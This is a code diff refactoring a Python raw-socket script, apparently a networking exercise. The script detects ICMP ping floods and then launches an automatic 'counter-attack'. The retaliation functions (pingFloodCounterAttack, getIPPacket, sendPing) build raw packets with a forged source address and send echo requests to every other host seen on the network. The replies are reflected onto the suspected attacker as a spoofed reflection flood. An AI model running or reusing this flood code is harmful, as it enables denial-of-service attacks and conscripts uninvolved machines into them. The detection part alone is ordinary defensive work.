@@ -1,10 +1,8 @@
-from datetime import datetime as dt
-import socket
-import sys
-import struct
 import math
-import os
-
+import socket
+import struct
+import sys
+from datetime import datetime as dt
 
 # DEFS
 ETH_P_ALL = 0x0003
@@ -12,25 +10,31 @@ ETH_P_SIZE = 65536
 ETH_P_IP = 0x0800
 IP_PROTO_ICMP = 1
 
-ATTACK_TIME = 5
-KNOWN_HOSTS = {}
-ip_dictionary = dict({})
+KNOWN_HOSTS = dict({})
+ATTACK_TIME_SECONDS = 5
+ATTACK_PACKET_COUNT_THRESHOLD = 10
+ATTACK_PACKET_INTERVAL_THRESHOLD = 0.01
 
 
 def bytes_to_mac(bytes_mac):
     return ":".join("{:02x}".format(x) for x in bytes_mac)
 
 
-def addFoundIP(ip: str, mac: str = '') -> bool:
-    if ip not in ip_dictionary.keys():
-        ip_dictionary[ip] = dict({
-            'pktIntervalSec': math.inf,
-            'attackPktsCount': 0,
+def addHost(ip: str, mac: str = ''):
+    if ip not in KNOWN_HOSTS.keys():
+        print('--- Add founded Ip ---')
+        print('-> Ip: ', ip)
+        print('-> MAC: ', mac)
+        print('-> Math.inf', math.inf)
+
+        KNOWN_HOSTS[ip] = dict({
+            'packageInterval': math.inf,
+            'packageCount': 0,
             'MAC': mac,
         })
 
-        print('MAC:', bytes_to_mac(eth[1]))
-        print('IP:', source_address)
+        print('--> MAC:', bytes_to_mac(eth[1]))
+        print('--> IP:', source_address)
         return True
     return False
 
@@ -47,117 +51,115 @@ def createSocket():
         sys.exit(1)
 
 
-def receivePacket(ip: str):
+def verifyPacket(ip: str):
     now = dt.now()
-    if 'lastPacketAt' not in ip_dictionary[ip].keys():
-        ip_dictionary[ip]['lastPacketAt'] = now
+
+    if 'lastPacketAt' not in KNOWN_HOSTS[ip].keys():
+        KNOWN_HOSTS[ip]['lastPacketAt'] = now
         return
 
-    packet_inteval_dt = now - ip_dictionary[ip]['lastPacketAt']
-    ip_dictionary[ip]['pktIntervalSec'] = packet_inteval_dt.total_seconds()
-    ip_dictionary[ip]['lastPacketAt'] = now
+    packet_inteval = now - KNOWN_HOSTS[ip]['lastPacketAt']
+    KNOWN_HOSTS[ip]['packageInterval'] = packet_inteval.total_seconds()
+    KNOWN_HOSTS[ip]['lastPacketAt'] = now
 
 
-def getPacketInterval(ip: str) -> float:
-    if 'pktIntervalSec' not in ip_dictionary[ip].keys():
-        ip_dictionary[ip]['pktIntervalSec'] = math.inf
-    return ip_dictionary[ip]['pktIntervalSec']
+def getPacketInterval(ip: str):
+    if 'packageInterval' not in KNOWN_HOSTS[ip].keys():
+        KNOWN_HOSTS[ip]['packageInterval'] = math.inf
+    return KNOWN_HOSTS[ip]['packageInterval']
 
-def isPingFloodAttack(ip: str, interval: float) -> bool:
 
-    ATTACK_PKTCOUNT_THRESHOLD = 10
-    ATTACK_PKTINTERVAL_THRESHOLD = 0.01
-
-    # if the property was not initialized, initialize
-    if 'attackPktsCount' not in ip_dictionary[ip].keys():
-        ip_dictionary[ip]['attackPktsCount'] = 0
+def isPingFloodAttack(ip: str, time_interval: float):
+    if 'packageCount' not in KNOWN_HOSTS[ip].keys():
+        KNOWN_HOSTS[ip]['packageCount'] = 0
         return False
 
-    # if the interval of the packets is less than the threshold, then is an attack
-    if interval < ATTACK_PKTINTERVAL_THRESHOLD:
-        ip_dictionary[ip]['attackPktsCount'] += 1
+    if time_interval < ATTACK_PACKET_INTERVAL_THRESHOLD:
+        KNOWN_HOSTS[ip]['packageCount'] += 1
 
-    # if the source overlaps the max attack pkt count, counter attack
-    if ip_dictionary[ip]['attackPktsCount'] >= ATTACK_PKTCOUNT_THRESHOLD:
+    if KNOWN_HOSTS[ip]['packageCount'] >= ATTACK_PACKET_COUNT_THRESHOLD:
         return True
 
     return False
 
 
-def printInfo():
-    for ip in ip_dictionary.keys():
-        pktInterval = 0
-        lastPacketAt = 0
-        attackPktsCount = 0
+def debugPrint():
+    for ip in KNOWN_HOSTS.keys():
+        packet_interval = 0
+        last_packet_at = 0
+        packet_count = 0
         mac = ''
-        if 'pktIntervalSec' in ip_dictionary[ip].keys():
-            pktInterval = ip_dictionary[ip]['pktIntervalSec']
-        if 'lastPacketAt' in ip_dictionary[ip].keys():
-            lastPacketAt = ip_dictionary[ip]['lastPacketAt']
-        if 'attackPktsCount' in ip_dictionary[ip].keys():
-            attackPktsCount = ip_dictionary[ip]['attackPktsCount']
-        if 'MAC' in ip_dictionary[ip].keys():
-            mac = ip_dictionary[ip]['MAC']
-        print('IP:', ip,
-              '\tMAC', mac,
-              '\tPkt Interval:', pktInterval,
-              '\tLastPktAt:', lastPacketAt,
-              '\tAttackPkts:', attackPktsCount)
+
+        if 'packageInterval' in KNOWN_HOSTS[ip].keys():
+            packet_interval = KNOWN_HOSTS[ip]['packageInterval']
+        if 'lastPacketAt' in KNOWN_HOSTS[ip].keys():
+            last_packet_at = KNOWN_HOSTS[ip]['lastPacketAt']
+        if 'packageCount' in KNOWN_HOSTS[ip].keys():
+            packet_count = KNOWN_HOSTS[ip]['packageCount']
+        if 'MAC' in KNOWN_HOSTS[ip].keys():
+            mac = KNOWN_HOSTS[ip]['MAC']
+
+        print('#################')
+        print('- IP Address: ', ip,
+              '\t- MAC Address: ', mac,
+              '\t- Packet Interval: ', packet_interval,
+              '\t- Last packet at: ', last_packet_at,
+              '\t- Packet counts: ', packet_count)
+        print('#################')
 
 
-# ------------------------ Ping flood ------------------------
+# ------------------------ Flooding ------------------------
 
-def getBotnetList(ip_attack: str) -> list:
-    botnet_ls = []
+def getHostsList(ip_attack: str):
+    hosts = []
 
-    for ip in ip_dictionary.keys():
+    for ip in KNOWN_HOSTS.keys():
         if ip == ip_attack:
             continue
         item = dict({
             'ip_dest': ip,
-            'mac_dest': ip_dictionary[ip]['MAC'],
+            'mac_dest': KNOWN_HOSTS[ip]['MAC'],
         })
-        botnet_ls.append(item)
+        hosts.append(item)
 
-    return botnet_ls
+    return hosts
 
 
-def executeCounterAttack(ip_attack: str, max_sec: int):
+def pingFloodCounterAttack(ip_attack: str, max_time: int):
+    print(' ------ Start flooding ------ ')
+
     start_time = dt.now()
-
-    botnet_ls = getBotnetList(ip_attack)
-    stats = [0 for _ in range(len(botnet_ls))]
-
     info_time = dt.now()
+    hosts_list = getHostsList(ip_attack)
+    status = [0 for _ in range(len(hosts_list))]
 
     while True:
         exec_elapsed_sec = (dt.now() - start_time).total_seconds()
-
         info_elapsed = (dt.now() - info_time).total_seconds()
+
         if info_elapsed >= 1:
             info_time = dt.now()
 
-        if exec_elapsed_sec >= max_sec:
+        if exec_elapsed_sec >= max_time:
             break
 
-        for i in range(len(botnet_ls)):
-            bot = botnet_ls[i]
+        for i in range(len(hosts_list)):
+            bot = hosts_list[i]
             s = getSocket(None, socket.getprotobyname('icmp'))
             sendPing(s, ip_attack, bot['ip_dest'])
             s.close()
-            # inc the qty of ping sent
-            stats[i] += 1
+            status[i] += 1
 
-    print('Bot list:', botnet_ls)
-    print('Stats:', stats)
-    print('flooding done')
+    print('Host list:', hosts_list)
+    print('Status:', status)
+    print(' ------ End flooding ------ ')
 
 
-# ------------------------ End of Ping flood ------------------------
+# ------------------------ Flooding ------------------------
 
 # ------------------------ Send Ping ------------------------
 
-def getChecksum(msg: bytes) -> int:
+def getChecksum(msg: bytes):
     s = 0
     msg = (msg + b'\x00') if len(msg) % 2 else msg
     for i in range(0, len(msg), 2):
@@ -180,9 +182,9 @@ def getIcmpRequestHeader():
     return header
 
 
-def getIcmpPacket() -> bytes:
+def getIcmpPacket():
     icmp_header_props = getIcmpRequestHeader()
-    icmp_h = struct.pack(
+    icmp_header = struct.pack(
         '!BBHHH',
         icmp_header_props['type'],
         icmp_header_props['code'],
@@ -196,10 +198,8 @@ def getIcmpPacket() -> bytes:
     for i in range(startVal, startVal + 55):
         padBytes += [(i & 0xff)]  # Keep chars in the 0-255 range
     data = bytes(padBytes)
-
-    checksum = getChecksum(icmp_h + data)
-
-    icmp_h = struct.pack(
+    checksum = getChecksum(icmp_header + data)
+    icmp_header = struct.pack(
         '!BBHHH',
         icmp_header_props['type'],
         icmp_header_props['code'],
@@ -207,12 +207,12 @@ def getIcmpPacket() -> bytes:
         icmp_header_props['id'],
         icmp_header_props['seqnumber'],
     )
-    icmp_pkt = icmp_h + data
+    icmp_packet = icmp_header + data
+    return icmp_packet
 
-    return icmp_pkt
 
-
-def getIPPacket(ip_source: str, ip_dest: str) -> bytes:
+def getIPPacket(ip_source: str, ip_dest: str):
+    # Header IP
     ip_ver = 4
     ip_ihl = 5
     ip_tos = 0
@@ -244,8 +244,6 @@ def getIPPacket(ip_source: str, ip_dest: str) -> bytes:
     return ip_h
 
 
-
-
 def sendPing(s: socket.socket, ip_source: str, ip_dest: str):
     icmp_pkt = getIcmpPacket()
     ip_h = getIPPacket(ip_source, ip_dest)
@@ -254,19 +252,15 @@ def sendPing(s: socket.socket, ip_source: str, ip_dest: str):
     s.sendto(ip_h + icmp_pkt, (dest_addr, 0))
 
 
-
-def getSocket(if_net: str, proto: int = socket.ntohs(ETH_P_ALL)) -> socket:
+def getSocket(if_net: str, proto: int = socket.ntohs(ETH_P_ALL)):
     try:
         s = None
-
         if proto == socket.getprotobyname('icmp'):
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                               proto)
-            # print('icmp socket created!')
         else:
             s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                               proto)
-            # print('eth socket created!')
     except OSError as msg:
         print('failed to create socket', str(msg))
         sys.exit(1)
@@ -275,7 +269,6 @@ def getSocket(if_net: str, proto: int = socket.ntohs(ETH_P_ALL)) -> socket:
         s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     else:
         s.bind((if_net, 0))
-
     return s
 
 
@@ -325,21 +318,19 @@ if __name__ == "__main__":
                 icmp_seq = icmph[3]
                 icmp_payload = icmph[4]
 
-                print("Type: ", icmp_type)
-                print("Code: ", icmp_code)
+                print("ICMP Type: ", icmp_type)
+                print("ICMP Code: ", icmp_code)
 
                 if icmp_type == 8 and icmp_code == 0 :
                     print("Echo Request")
-                    addFoundIP(source_address, bytes_to_mac(eth[1]))
 
-                    receivePacket(source_address)
+                    addHost(source_address, bytes_to_mac(eth[1]))
+                    verifyPacket(source_address)
+                    packet_interval = getPacketInterval(source_address)
 
-                    pInterval = getPacketInterval(source_address)
-
-                    if isPingFloodAttack(source_address, pInterval):
-                        printInfo()
-                        executeCounterAttack(source_address, ATTACK_TIME)
-
+                    if isPingFloodAttack(source_address, packet_interval):
+                        debugPrint()
+                        pingFloodCounterAttack(source_address, ATTACK_TIME_SECONDS)
 
                 #if icmp_type == 0 and icmp_code == 0 :
                     #print("Echo Reply")
